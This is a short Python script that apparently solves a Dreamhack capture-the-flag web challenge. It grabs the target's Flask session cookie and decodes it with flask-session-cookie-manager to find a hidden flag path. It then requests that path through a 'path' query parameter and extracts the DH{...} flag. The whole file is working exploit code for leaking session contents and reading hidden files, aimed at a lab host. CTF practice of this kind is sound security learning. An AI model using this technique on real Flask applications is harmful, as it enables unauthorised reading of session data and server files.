import requests
import os
import re
host="host1.dreamhack.games:16079/"
res=requests.get(f"http://{host}/")
session_cookie=res.cookies['session']
print("session:", session_cookie)

tool_path='./flask-session-cookie-manager/flask_session_cookie_manager3.py'

output = os.popen(f"python {tool_path} decode -c {session_cookie}").read()
print(output)
check_in=output.index("secrets")
check_out=output.index("flag") 
flag_dir=output[check_in:check_out+4]
print("flag_dir=",flag_dir)
res=requests.get(f"http://{host}/?path={flag_dir[7:]}")
print(re.findall(r'DH\{.+?\}', res.text))